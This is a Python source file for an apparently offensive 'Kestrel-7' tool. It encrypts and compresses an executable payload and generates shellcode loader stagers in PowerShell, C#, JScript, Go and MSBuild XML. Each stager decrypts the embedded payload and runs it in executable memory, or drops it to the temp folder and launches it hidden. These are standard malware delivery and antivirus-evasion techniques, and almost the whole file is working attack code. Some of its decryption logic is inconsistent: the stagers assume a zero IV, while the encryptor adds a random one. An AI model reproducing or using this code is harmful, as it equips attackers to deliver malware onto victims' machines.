#!/usr/bin/env python3
"""
encryptor.py - Payload encryption utility for Kestrel-7
Generates encrypted payloads for all stager formats
Usage: python3 encryptor.py --input agent.exe --key "Kestrel7_Win11_RevShell_2026"
"""

import os
import sys
import base64
import argparse
import struct
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import json
import xml.etree.ElementTree as ET
import zlib

class PayloadEncryptor:
    def __init__(self, key, use_compression=True):
        self.key = key[:32].encode('utf-8')
        self.use_compression = use_compression
        if len(self.key) < 32:
            self.key = hashlib.sha256(self.key).digest()
        
    def encrypt_aes(self, data):
        """Encrypt with AES-256-CBC"""
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data, AES.block_size))
        return iv + encrypted
    
    def decrypt_aes(self, data):
        """Decrypt AES-256-CBC"""
        iv = data[:16]
        encrypted = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(encrypted), AES.block_size)
    
    def encrypt_xor(self, data):
        """Simple XOR fallback"""
        result = bytearray(data)
        for i in range(len(result)):
            result[i] ^= self.key[i % len(self.key)]
        return bytes(result)
    
    def encrypt_payload(self, payload_path):
        """Read, compress, encrypt payload"""
        with open(payload_path, 'rb') as f:
            data = f.read()
        
        # Compress
        if self.use_compression:
            data = zlib.compress(data, 9)
        
        # Add magic header
        magic = b'K7' + struct.pack('<I', len(data))
        data = magic + data
        
        # Encrypt
        encrypted = self.encrypt_aes(data)
        
        return encrypted
    
    def generate_b64(self, payload_path):
        """Generate Base64 encoded encrypted payload"""
        encrypted = self.encrypt_payload(payload_path)
        return base64.b64encode(encrypted).decode('utf-8')
    
    def generate_hex(self, payload_path):
        """Generate hex encoded payload"""
        encrypted = self.encrypt_payload(payload_path)
        return encrypted.hex()
    
    def generate_powershell(self, payload_path, output_path):
        """Generate PowerShell stager with embedded payload"""
        b64 = self.generate_b64(payload_path)
        
        ps_template = '''
# Kestrel-7 PowerShell Stager (Encrypted)
# Generated: {timestamp}
$payload = [Convert]::FromBase64String('{b64}')
$key = [System.Text.Encoding]::UTF8.GetBytes('{key}')
$aes = New-Object System.Security.Cryptography.AesManaged
$aes.Key = $key
$aes.IV = @(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
$decryptor = $aes.CreateDecryptor()
try {{
    $decrypted = $decryptor.TransformFinalBlock($payload, 0, $payload.Length)
    $decompressed = [System.IO.Compression.DeflateStream]::new([System.IO.MemoryStream]::new($decrypted[6..$decrypted.Length]), [System.IO.Compression.CompressionMode]::Decompress)
    $ms = [System.IO.MemoryStream]::new()
    $decompressed.CopyTo($ms)
    $shellcode = $ms.ToArray()
    $decryptor.Dispose()
    $aes.Dispose()
    
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}}
'@
    $mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
    $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    if ($thread -ne [IntPtr]::Zero) {{
        [Win32]::WaitForSingleObject($thread, 0xFFFFFFFF)
        [Win32]::CloseHandle($thread)
    }}
}} catch {{
    # XOR fallback
    for ($i=0; $i -lt $payload.Length; $i++) {{
        $payload[$i] = $payload[$i] -bxor [byte]$key[$i % $key.Length]
    }}
    $shellcode = $payload[6..$payload.Length]
    [System.IO.Compression.DeflateStream]::new([System.IO.MemoryStream]::new($shellcode), [System.IO.Compression.CompressionMode]::Decompress)
}}
'''
        
        with open(output_path, 'w') as f:
            f.write(ps_template.format(
                b64=b64,
                key=self.key.decode('utf-8'),
                timestamp=__import__('datetime').datetime.now().isoformat()
            ))
        
        print(f"[+] PowerShell stager: {output_path}")
    
    def generate_csharp(self, payload_path, output_path):
        """Generate C# stager with embedded payload"""
        hex_data = self.generate_hex(payload_path)
        
        cs_template = '''
// Kestrel-7 C# Stager (Encrypted)
// Generated: {timestamp}
using System;
using System.Runtime.InteropServices;

class Kestrel7
{{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    public static void Main()
    {{
        try
        {{
            byte[] encrypted = HexStringToBytes("{hex}");
            byte[] key = System.Text.Encoding.UTF8.GetBytes("{key}");
            
            // AES decryption
            using (var aes = new System.Security.Cryptography.AesManaged())
            {{
                aes.Key = key;
                aes.IV = new byte[16];
                aes.Mode = System.Security.Cryptography.CipherMode.CBC;
                aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
                using (var decryptor = aes.CreateDecryptor())
                {{
                    byte[] decrypted = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
                    // Decompress (skip magic header)
                    byte[] compressed = new byte[decrypted.Length - 6];
                    Array.Copy(decrypted, 6, compressed, 0, compressed.Length);
                    byte[] shellcode = Decompress(compressed);
                    
                    IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                    Marshal.Copy(shellcode, 0, mem, shellcode.Length);
                    IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                    if (thread != IntPtr.Zero)
                    {{
                        WaitForSingleObject(thread, 0xFFFFFFFF);
                        CloseHandle(thread);
                    }}
                    VirtualFree(mem, 0, 0x8000);
                }}
            }}
        }}
        catch {{}}
    }}
    
    private static byte[] HexStringToBytes(string hex)
    {{
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
        {{
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }}
        return bytes;
    }}
    
    private static byte[] Decompress(byte[] data)
    {{
        using (var ms = new System.IO.MemoryStream(data))
        using (var ds = new System.IO.Compression.DeflateStream(ms, System.IO.Compression.CompressionMode.Decompress))
        using (var outMs = new System.IO.MemoryStream())
        {{
            ds.CopyTo(outMs);
            return outMs.ToArray();
        }}
    }}
}}
'''
        
        with open(output_path, 'w') as f:
            f.write(cs_template.format(
                hex=hex_data,
                key=self.key.decode('utf-8'),
                timestamp=__import__('datetime').datetime.now().isoformat()
            ))
        
        print(f"[+] C# stager: {output_path}")
    
    def generate_js(self, payload_path, output_path):
        """Generate JavaScript stager (for HTA)"""
        b64 = self.generate_b64(payload_path)
        
        js_template = '''
// Kestrel-7 JavaScript Stager (Encrypted)
// Generated: {timestamp}
var payload = atob("{b64}");
var key = "{key}";
// Decrypt and execute via WSH
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var temp = fso.GetSpecialFolder(2);
var exe = temp + "\\\\kestrel7.exe";
var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(payload);
stream.SaveToFile(exe, 2);
stream.Close();
shell.Run(exe, 0, false);
'''
        
        with open(output_path, 'w') as f:
            f.write(js_template.format(
                b64=b64,
                key=self.key.decode('utf-8'),
                timestamp=__import__('datetime').datetime.now().isoformat()
            ))
        
        print(f"[+] JavaScript stager: {output_path}")
    
    def generate_go(self, payload_path, output_path):
        """Generate Go stager"""
        b64 = self.generate_b64(payload_path)
        
        go_template = '''
// Kestrel-7 Go Stager (Encrypted)
// Generated: {timestamp}
package main
import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "syscall"
    "unsafe"
    "compress/zlib"
    "bytes"
    "io"
)

func main() {{
    b64 := "{b64}"
    key := []byte("{key}")
    encrypted, _ := base64.StdEncoding.DecodeString(b64)
    block, _ := aes.NewCipher(key)
    iv := make([]byte, 16)
    stream := cipher.NewCBCDecrypter(block, iv)
    decrypted := make([]byte, len(encrypted))
    stream.CryptBlocks(decrypted, encrypted)
    // Decompress
    r, _ := zlib.NewReader(bytes.NewReader(decrypted[6:]))
    shellcode, _ := io.ReadAll(r)
    r.Close()
    // Execute
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    createThread := kernel32.NewProc("CreateThread")
    waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    mem, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)
    copy((*[1 << 30]byte)(unsafe.Pointer(mem))[:len(shellcode)], shellcode)
    thread, _, _ := createThread.Call(0, 0, mem, 0, 0, 0)
    waitForSingleObject.Call(thread, 0xFFFFFFFF)
}}
'''
        
        with open(output_path, 'w') as f:
            f.write(go_template.format(
                b64=b64,
                key=self.key.decode('utf-8'),
                timestamp=__import__('datetime').datetime.now().isoformat()
            ))
        
        print(f"[+] Go stager: {output_path}")
    
    def generate_msbuild_xml(self, payload_path, output_path):
        """Generate MSBuild XML with embedded payload"""
        b64 = self.generate_b64(payload_path)
        
        xml_template = '''<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Kestrel7">
    <UsingTask TaskName="Kestrel7Task" TaskFactory="CodeTaskFactory" 
               AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
      <ParameterGroup/>
      <Task>
        <Using Namespace="System"/>
        <Using Namespace="System.Security.Cryptography"/>
        <Using Namespace="System.Runtime.InteropServices"/>
        <Using Namespace="System.IO"/>
        <Using Namespace="System.IO.Compression"/>
        <Code Type="Fragment" Language="cs">
          <![CDATA[
            public class Kestrel7Task : Microsoft.Build.Utilities.Task
            {{
                [DllImport("kernel32.dll")]
                public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                [DllImport("kernel32.dll")]
                public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                [DllImport("kernel32.dll")]
                public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
                [DllImport("kernel32.dll")]
                public static extern bool CloseHandle(IntPtr hObject);
                [DllImport("kernel32.dll")]
                public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
                
                public override bool Execute()
                {{
                    try
                    {{
                        byte[] encrypted = Convert.FromBase64String("{b64}");
                        byte[] key = System.Text.Encoding.UTF8.GetBytes("{key}");
                        byte[] decrypted = Decrypt(encrypted, key);
                        byte[] shellcode = Decompress(decrypted);
                        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
                        IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
                        if (thread != IntPtr.Zero)
                        {{
                            WaitForSingleObject(thread, 0xFFFFFFFF);
                            CloseHandle(thread);
                        }}
                        VirtualFree(mem, 0, 0x8000);
                    }}
                    catch {{}}
                    return true;
                }}
                
                private byte[] Decrypt(byte[] data, byte[] key)
                {{
                    using (var aes = new AesManaged())
                    {{
                        aes.Key = key;
                        aes.IV = new byte[16];
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        using (var decryptor = aes.CreateDecryptor())
                        {{
                            return decryptor.TransformFinalBlock(data, 0, data.Length);
                        }}
                    }}
                }}
                
                private byte[] Decompress(byte[] data)
                {{
                    byte[] compressed = new byte[data.Length - 6];
                    Array.Copy(data, 6, compressed, 0, compressed.Length);
                    using (var ms = new MemoryStream(compressed))
                    using (var ds = new DeflateStream(ms, CompressionMode.Decompress))
                    using (var outMs = new MemoryStream())
                    {{
                        ds.CopyTo(outMs);
                        return outMs.ToArray();
                    }}
                }}
            }}
          ]]>
        </Code>
      </Task>
    </UsingTask>
    <Kestrel7Task />
  </Target>
</Project>'''
        
        with open(output_path, 'w') as f:
            f.write(xml_template.format(
                b64=b64,
                key=self.key.decode('utf-8')
            ))
        
        print(f"[+] MSBuild stager: {output_path}")
    
    def generate_all(self, payload_path, output_dir='payloads'):
        """Generate all stager variants"""
        os.makedirs(output_dir, exist_ok=True)
        
        base = os.path.splitext(os.path.basename(payload_path))[0]
        
        self.generate_powershell(payload_path, os.path.join(output_dir, f'{base}_stager.ps1'))
        self.generate_csharp(payload_path, os.path.join(output_dir, f'{base}_stager.cs'))
        self.generate_js(payload_path, os.path.join(output_dir, f'{base}_stager.js'))
        self.generate_go(payload_path, os.path.join(output_dir, f'{base}_stager.go'))
        self.generate_msbuild_xml(payload_path, os.path.join(output_dir, f'{base}_stager.xml'))
        
        # Raw encrypted payloads
        encrypted = self.encrypt_payload(payload_path)
        with open(os.path.join(output_dir, f'{base}_encrypted.bin'), 'wb') as f:
            f.write(encrypted)
        
        with open(os.path.join(output_dir, f'{base}_encrypted.b64'), 'w') as f:
            f.write(base64.b64encode(encrypted).decode('utf-8'))
        
        print(f"\n[+] All stagers generated in {output_dir}/")
        print(f"[+] Raw encrypted payload: {output_dir}/{base}_encrypted.bin")
        print(f"[+] Base64 payload: {output_dir}/{base}_encrypted.b64")

def main():
    parser = argparse.ArgumentParser(description='Kestrel-7 Payload Encryptor')
    parser.add_argument('--input', '-i', required=True, help='Input payload file')
    parser.add_argument('--key', '-k', default='Kestrel7_Win11_RevShell_2026', help='Encryption key')
    parser.add_argument('--output', '-o', default='payloads', help='Output directory')
    parser.add_argument('--no-compression', '-n', action='store_true', help='Disable compression')
    parser.add_argument('--format', '-f', choices=['all', 'ps', 'cs', 'js', 'go', 'msbuild', 'raw'], 
                        default='all', help='Output format')
    parser.add_argument('--generate-key', '-g', action='store_true', help='Generate random key')
    
    args = parser.parse_args()
    
    if args.generate_key:
        key = base64.b64encode(get_random_bytes(32)).decode('utf-8')
        print(f"[*] Generated key: {key}")
        print(f"[*] Use: --key \"{key}\"")
        return
    
    if not os.path.exists(args.input):
        print(f"[ERROR] Input file not found: {args.input}")
        sys.exit(1)
    
    encryptor = PayloadEncryptor(args.key, use_compression=not args.no_compression)
    
    if args.format == 'all':
        encryptor.generate_all(args.input, args.output)
    elif args.format == 'ps':
        encryptor.generate_powershell(args.input, os.path.join(args.output, 'stager.ps1'))
    elif args.format == 'cs':
        encryptor.generate_csharp(args.input, os.path.join(args.output, 'stager.cs'))
    elif args.format == 'js':
        encryptor.generate_js(args.input, os.path.join(args.output, 'stager.js'))
    elif args.format == 'go':
        encryptor.generate_go(args.input, os.path.join(args.output, 'stager.go'))
    elif args.format == 'msbuild':
        encryptor.generate_msbuild_xml(args.input, os.path.join(args.output, 'stager.xml'))
    elif args.format == 'raw':
        encrypted = encryptor.encrypt_payload(args.input)
        with open(os.path.join(args.output, 'payload.bin'), 'wb') as f:
            f.write(encrypted)
        print(f"[+] Raw payload: {os.path.join(args.output, 'payload.bin')}")
    
    # Generate hash for integrity
    import hashlib
    with open(args.input, 'rb') as f:
        sha256 = hashlib.sha256(f.read()).hexdigest()
    print(f"[*] Payload SHA256: {sha256}")

if __name__ == '__main__':
    main()
